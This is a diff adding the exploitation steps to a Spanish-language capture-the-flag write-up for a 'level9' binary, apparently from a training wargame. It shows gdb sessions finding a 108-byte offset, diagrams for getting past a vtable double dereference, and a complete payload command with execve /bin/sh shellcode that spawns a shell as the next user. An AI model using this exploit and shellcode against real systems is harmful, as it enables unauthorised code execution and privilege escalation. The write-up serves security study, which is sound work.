@@ -139,6 +139,77 @@ y como argumento le pasa argv[1]
 
       Normalmente, el puntero a la vtable, se encuentra en al principio de la instancia del objeto.
 
+16.- Vamos con la explotación
 
+17.- El plan es insertar una cadena como argv[1] para que probocar un overflow en el memcyp() y ejecutar una shell como
+usuario bonus0 y obtener la flag haciendo uso del call que hay en main<+159>
 
-python -c "print '\x0c\xa0\x04\x08' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * 83 + '\x0c\xa0\x04\x08'" > /tmp/payload
+18.- Lo primero es ver el offset que proboca el overflow. Usaremos la herramienta online https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+Le pasamos el patron como argv[1] desde gdb
+  [...]
+    Program received signal SIGSEGV, Segmentation fault.
+    0x08048682 in main ()
+  [...]
+Con la herramienta online no da un offset de 108
+
+19.- Ahora necesitamos saber en que dirección se almacena la cadena cuando se ejecuta el memcpy()
+  (gdb) disassemble main
+    [...]
+      0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
+    [...]
+  (gdb) disassemble _ZN1N13setAnnotationEPc
+    [...]
+      0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
+    [...]
+  Insertamos un breakpoint para ver la estructura de la llamada a memcpy()
+  (gdb) b *0x08048733 
+  Breakpoint 1 at 0x8048733
+  (gdb) r AAAA BBBB
+    [...]
+    Breakpoint 1, 0x08048733 in N::setAnnotation(char*) ()
+    [...]
+  La calling convention de 32bits nos indica que el primer parámetro es esp, el segundo es esp+4...
+  Entonces la dirección donde se almacena memcpy() es el argumento primero que es esp
+  (gdb) x $esp
+  0xbffffc00:	0x0804a00c
+  Esta es la dirección que buscamos 0x0804a00c. La dirección que tiene que llamar el call de main<+159>
+    
+20.- Ahora tenemos un problema y es la doble desreferencia que hace para obtener la dirección de la sobrecarga del operator+()
+  [...]
+    0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10] 
+    0x08048680 <+140>:	mov    eax,DWORD PTR [eax]      
+    0x08048682 <+142>:	mov    edx,DWORD PTR [eax]      
+  [...]
+  Si el payload tiene esta estructura:
+    [shelcode] + [offset] + [addr shelcode] 
+    La primera desreferencia va ha obtener [addr shellcode] para luego desreferenciar los 4 bytes del shellcode dando un crash
+    [shelcode] + [offset] + [addr shelcode] 
+      ^                          |
+      |--------------------------v ; Primera desreferencia           ->  0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
+
+    [shelcode] + [offset] + [addr shelcode] 
+      v
+      |
+      ---[...]---> [invalid addres] ; Segunda desreferencia = crash  ->  0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
+  
+  Para solucionar esto podemos insertar antes del shellcode otra vez la dirección donde está el shellcode de esta manera
+    [addr shelcode] + [shelcode] + [offset] + [addr shelcode] 
+    Quedando así
+    [addr shelcode] + [shelcode] + [offset] + [addr shelcode] 
+      ^                                           v
+      |-------------------------------------------|; Primera desreferencia  ->  0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
+
+    [addr shelcode] + [shelcode] + [offset] + [addr shelcode] ->  0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
+      |                    ^ 
+      v--------------------|
+
+21.- Lo último que necesitamos es el shellcode que podemos obtenerlo de aquí: https://shell-storm.org/shellcode/files/shellcode-841.html
+  \x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
+
+22.- Montamos el payload
+  python -c "print '\x0c\xa0\x04\x08' + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'A' * 83 + '\x0c\xa0\x04\x08'" > /tmp/payload
+
+23.- Ejecutamos
+  ./level9 $(cat /tmp/payload) xxxx
+
+24.- Listo!!!
